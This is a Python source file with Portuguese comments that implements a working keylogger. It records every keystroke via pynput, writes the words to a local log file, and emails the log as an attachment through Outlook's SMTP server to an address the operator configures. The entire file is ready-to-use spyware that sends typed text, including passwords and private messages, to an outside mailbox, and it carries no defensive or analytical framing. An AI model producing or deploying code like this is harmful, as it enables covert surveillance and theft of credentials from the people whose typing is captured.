import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener

fullog = '' # String que armazena o log completo das teclas pressionadas
words = '' # String temporária para armazenar uma palavra antes de adicioná-la ao log completo
log_file_path = 'keylog.txt' # Caminho para o arquivo de log
email = '_emailutilizadoparareceberolog_'
password = 'senhadoemail'
recipient_email = '_emailutilizadoparareceberolog_' # Endereço de e-mail do destinatário

def on_press(key): # Função para quando uma tecla for pressionada
    global words
    global fullog

    if key == Key.space or key == Key.enter:  # Se for um espaço ou enter, adiciona a palavra ao registro completo
        words += ' '
        fullog += words
        words = ''
        if len(fullog) >= 20: # Se o registro completo atingir o limite de caracteres, escreve no arquivo de log
            write_to_log(fullog)
            fullog = ''
    elif key == Key.shift_l or key == Key.shift_r: # Verifica se a tecla pressionada é Shift es ou Shift dr. Se V, o código retorna sem fazer nd.
        return
    elif key == Key.backspace: # Verifica se a tecla pressionada é a tecla Backspace. Se for, remove o último caractere da palavra temporária
        words = words[:-1]
    else:                       # Esta parte do código é executada se nenhuma das condições anteriores for atendida
        char = f'{key}'         # se a tecla pressionada não for Shift nem Backspace o código converte a tecla pressionada em uma string
        char = char[1:-1]       # remove os caracteres de aspas que envolvem essa string
        words += char           # em seguida, esse caractere é adicionado à palavra temporária

    if key == Key.esc: # Verifica se a tecla pressionada é a tecla Esc. Se for, a função retorna False, o que encerra o programa
        return False

def write_to_log(log_entry): # Função que escreve no arquivo de log
    with open(log_file_path, 'a') as log_file: # Abre o arquivo de log para anexar
        log_file.write(log_entry) # Escreve a entrada de log no arquivo

    # Envia o arquivo de log por e-mail
    send_email_with_attachment(email, password, recipient_email, log_file_path)

def send_email_with_attachment(sender_email, sender_password, recipient_email, file_path):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = 'Keylogger Log'

    # Anexa o arquivo de log ao e-mail
    with open(file_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {file_path}')
    msg.attach(part)

    # Inicia o servidor SMTP e envia o e-mail
    with smtplib.SMTP('smtp-mail.outlook.com', 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())

with Listener(on_press=on_press) as listener: # Inicia o ouvinte de teclas
    listener.join() # Aguarda até que o usuário pressione a tecla Esc para encerrar
